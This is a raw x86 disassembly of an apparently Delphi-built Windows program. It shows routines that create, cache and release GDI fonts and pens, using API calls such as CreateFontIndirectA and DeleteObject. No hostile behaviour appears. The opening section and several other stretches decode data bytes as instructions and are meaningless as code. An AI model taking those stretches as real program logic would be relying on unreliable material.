add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
lea eax [ bx + si ]
fcomp [ esi + 0x42 ]
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax - 0x6fffbfcd ] al
sub [ ebx ] dh
imul bp [ ebp + 0x43 ] 0x6e61
jbe r-xdata
sub eax [ eax ]
or al 0x54
xor eax [ eax ]
nop
jae r-xdata
add [ eax ] al
xor [ ecx ] dl
inc eax
pop esp
inc edx
add al bl
pop eax
inc edx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5d ] al
pop ebp
imul esp [ ebx + 0x73 ] 0xc08b0000
fcomp [ edx + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
inc edx
add [ eax + eax ] ah
add [ eax ] al
nop
pop esp
inc edx
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax - 0x60 ] ch
inc edx
add [ eax + 0x540e0042 ] ah
dec ebp
je r-xdata
add [ eax ] al
inc eax
pop ebp
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax ] dh
adc [ eax ] eax
fdiv [ 0x35e40040 ]
sub_425eb9
pop ecx
inc edx
add al bl
xor eax 0xbdf40040
inc ecx
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add ah bl
rol [ edx ] 0x34
mov ebp 0x93700041
inc edx
add [ eax ] bl
rol [ edx ] 0x84
mov esi 0xc2ec0041
inc edx
add [ ebx + eax * 8 + 0x42 ] ch
add [ ebx + edx * 4 - 0x39dfffbe ] bh
inc edx
add ah dl
mov [ edx ] 0x14
mov [ edx ] sub_429508
jo r-xdata
xor eax [ eax ]
inc esp
xor eax [ eax ]
fadd st0
inc edx
add [ edi * 4 - 0x6c8fffbf ] dh
inc edx
add [ ebx + ecx * 8 + 0x42 ] bl
add [ eax - 0x2d ] bl
inc edx
add [ esp + edx * 8 ] ch
inc edx
add al dh
xchg ebp eax
inc edx
add [ eax ] al
aad 0x42
add [ ebp + edx * 8 + 0x42 ] dl
add [ eax + eax * 8 + 0x42 ] dh
add [ edx * 4 - 0x6a6bffbe ] cl
inc edx
add [ eax ] bh
0x42
sub_425f34
insb
fadd [ edx ]
mov ah 0xc9
inc edx
add [ eax + ebx * 8 + 0x42 ] dh
add [ esi + eax * 8 - 0x391bffbe ] al
inc edx
add [ eax ] ah
rol [ edx ] cl
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x425f5870
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x425edc70
add [ edx + ebx * 2 + 0x42 ] dh
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4260 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x340042 ] al
add [ eax ] al
imul esp [ ebx + 0x73 ] 0xc08b0000
les ebx [ edi + 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
pop edi
inc edx
add [ eax ] bl
add [ eax ] al
add [ eax - 0x27ffbda4 ] dl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ ecx + ebx * 8 ] dl
inc edx
add [ ecx + ebx * 8 + 0x42 ] al
add [ edx ] cl
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
popad
nop
and [ eax + 0x42 ] ah
add [ eax ] al
sub_425ffd
pop ecx
inc edx
add al bl
xor eax 0xbdf40040
inc ecx
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x340042d9 ] dh
mov ebp 0x93700041
inc edx
add al ah
fld [ edx ]
test [ esi - 0x6cffffbf ] bh
inc edx
add [ eax - 0x26 ] al
inc edx
add [ ebx + edx * 4 - 0x257fffbe ] bh
inc edx
add [ edx + ebx * 8 - 0x6afbffbe ] ch
inc edx
add [ eax ] cl
xchg ebp eax
inc edx
add al al
fiadd [ edx ]
mov [ ebp - 0x22bbffbe ] dl
inc edx
add ah ch
xchg ebp eax
inc edx
add [ ebp + ebx * 8 + 0x42 ] bl
add [ eax - 0x23 ] ah
inc edx
add [ eax ] al
xchg esi eax
inc edx
add [ ecx + ebx * 8 + 0x42 ] bl
add [ edx * 4 - 0x6a6bffbe ] cl
inc edx
add [ eax ] al
fadd [ edx ]
js r-xdata
inc edx
add [ eax - 0x4bffbd23 ] ah
fld [ edx ]
add eax 0x6f634954
outsb
mov eax eax
nop
pushad
inc edx
add [ edi ] al
add eax 0x6f634954
outsb
and [ eax + 0x42 ] ah
add [ edx + ebx * 2 + 0x42 ] dh
or [ edi + 0x72 ] al
popad
jo r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
add edi esi
inc [ ebx + ebx * 8 - 0x3974f882 ]
jne r-xdata
retn
cmp eax [ rw-data ]
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
push eax
call DeleteObject
pop esi
pop ebx
retn
call sub_403744
mov eax esi
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_4260c0
or al 0x61
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
inc edx
add [ eax + eax ] ah
add [ eax ] al
xor [ ecx ] dl
inc eax
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x61 ] dh
inc edx
add [ eax ] dl
push esp
push edx
jae r-xdata
add edi esi
inc [ ebx + ebx * 8 - 0x3974f882 ]
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
call sub_403744
mov eax esi
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_426134
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_426170
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_4261ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_426120
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_426194
xor edx edx
push ebp
push sub_426280
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426287
mov eax [ ebp - 0x4 ]
call sub_4261a0
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4027b4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4029b0
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_4081b0
test al al
je r-xdata
sub_426290
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_426194
xor ecx ecx
push ebp
push sub_426317
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4261a0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_426340
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_426194
xor eax eax
push ebp
push sub_4263a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4261ac
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_426290
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4263b0
mov eax [ ebp - 0x4 ]
call sub_4261a0
retn
mov eax ebx
mov si 0xfffd
call sub_40358c
sub_4263b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_426194
xor eax eax
push ebp
push sub_426414
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42641b
mov eax [ ebp - 0x4 ]
call sub_4261a0
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_40358c
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_426290
sub_426424
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_426194
xor edx edx
push ebp
push sub_426483
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42648a
mov eax [ ebp - 0x4 ]
call sub_4261a0
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_426490
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_41ba18
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42652d
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41b654
mov ebx eax
mov eax ebx
call sub_427a5c
inc [ ebp - 0x4 ]
mov eax ebx
call sub_427d70
mov eax [ rw-data ]
call sub_426424
mov eax [ rw-data ]
call sub_426424
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426534
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_41ba7c
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_41b654
call sub_427c48
inc esi
dec ebx
jne r-xdata
sub_426b83
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_41af78
retn
sub_426bb4
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402ea4
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402c94
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_426c68
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_4261ac
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_426cbc
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_426290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_426d00
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41bc50
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4269c0
xor eax eax
push ebp
push sub_426dbb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_4269c0
xor eax eax
push ebp
push sub_426d9e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4263b8
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_426e3c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426da5
mov eax [ ebp - 0x8 ]
call sub_4269d0
retn
mov eax ebx
call sub_4270c0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4270dc
sub_426dec
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4269c0
xor eax eax
push ebp
push sub_426e31
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_426340
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426e38
mov eax [ ebp - 0x4 ]
call sub_4269d0
retn
sub_426e50
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_426fd9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426fe0
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_404144
retn
mov eax [ rw-data ]
call sub_426194
xor eax eax
push ebp
push sub_426fb1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4261a0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404384
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_408ca8
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_404384
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_408ca8
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_404384
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_4082e8
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_427134
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_426ff8
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_426bb4
mov edx esp
mov eax ebx
call sub_426dec
add esp 0x2c
pop esi
pop ebx
retn
sub_427024
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_426dd4
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_426dec
add esp 0x2c
pop esi
pop ebx
retn
sub_427064
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_426dd4
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402da4
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_4043bc
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402c94
mov edx esp
mov eax ebx
call sub_426dec
sub_4270dc
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_427024
pop esi
pop ebx
retn
sub_427108
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_426dd4
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_426dec
add esp 0x30
pop ebx
retn
sub_42713c
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_426dd4
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_426dec
add esp 0x2c
pop esi
pop ebx
retn
sub_42716c
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_426dd4
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_426dec
add esp 0x2c
pop esi
pop ebx
retn
sub_427194
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_4261ac
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_4271d8
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_426290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_427200
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41bc50
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4269c0
xor eax eax
push ebp
push sub_42729f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_4269c0
xor eax eax
push ebp
push sub_427282
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4263b8
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4273e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427289
mov eax [ ebp - 0x8 ]
call sub_4269d0
retn
sub_4272b8
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_4272d0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4269c0
xor eax eax
push ebp
push sub_427315
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_426340
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42731c
mov eax [ ebp - 0x4 ]
call sub_4269d0
retn
sub_427328
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_4272b8
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_4272d0
add esp 0x10
pop esi
pop ebx
retn
sub_427350
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_426194
xor eax eax
push ebp
push sub_4273d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4261a0
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_42697c
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_427404
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_4272b8
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_4272d0
add esp 0x10
pop esi
pop ebx
retn
sub_427434
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_4272b8
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_4272d0
sub_427460
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_4261ac
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_4274a0
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_426290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_4274c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41bc50
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4269c0
xor eax eax
push ebp
push sub_427558
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_4269c0
xor eax eax
push ebp
push sub_42753b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4263b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427542
mov eax [ ebp - 0x8 ]
call sub_4269d0
retn
